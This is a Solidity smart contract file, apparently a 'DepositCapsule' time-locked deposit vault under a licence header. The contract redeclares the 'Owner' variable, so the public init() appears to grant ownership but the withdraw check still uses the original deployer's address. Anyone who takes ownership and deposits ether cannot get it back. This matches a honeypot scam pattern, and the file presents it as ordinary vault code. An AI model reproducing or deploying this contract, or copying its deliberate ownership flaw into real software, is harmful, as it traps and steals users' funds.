1 /*
2    Copyright (C) 2018 The Halo Platform
3    https://www.haloplatform.tech/
4    Scott Morrison
5 
6    This is free software and you are welcome to redistribute it under certain
7    conditions. ABSOLUTELY NO WARRANTY; for details visit:
8    https://www.gnu.org/licenses/gpl-2.0.html
9 */
10 pragma solidity ^0.4.20;
11 
12 contract Ownable {
13     address Owner = msg.sender;
14     modifier onlyOwner() { if (Owner == msg.sender) { _; } }
15     function transferOwner(address _owner) public onlyOwner {
16         address previousOwner;
17         if (address(this).balance == 0) {
18             previousOwner = Owner;
19             Owner = _owner;
20         }
21     }
22 }
23 
24 contract DepositCapsule is Ownable {
25     address public Owner;
26     mapping (address=>uint) public deposits;
27     uint public openDate;
28     
29     function init(uint openOnDate) public {
30         Owner = msg.sender;
31         openDate = openOnDate;
32     }
33     
34     function() public payable {  }
35     
36     function deposit() public payable {
37         if (msg.value >= 0.5 ether) {
38             deposits[msg.sender] += msg.value;
39         }
40     }
41 
42     function withdraw(uint amount) public onlyOwner {
43         if (now >= openDate) {
44             uint max = deposits[msg.sender];
45             if (amount <= max && max > 0) {
46                 if (!msg.sender.send(amount))
47                     revert();
48             }
49         }
50     }
51 }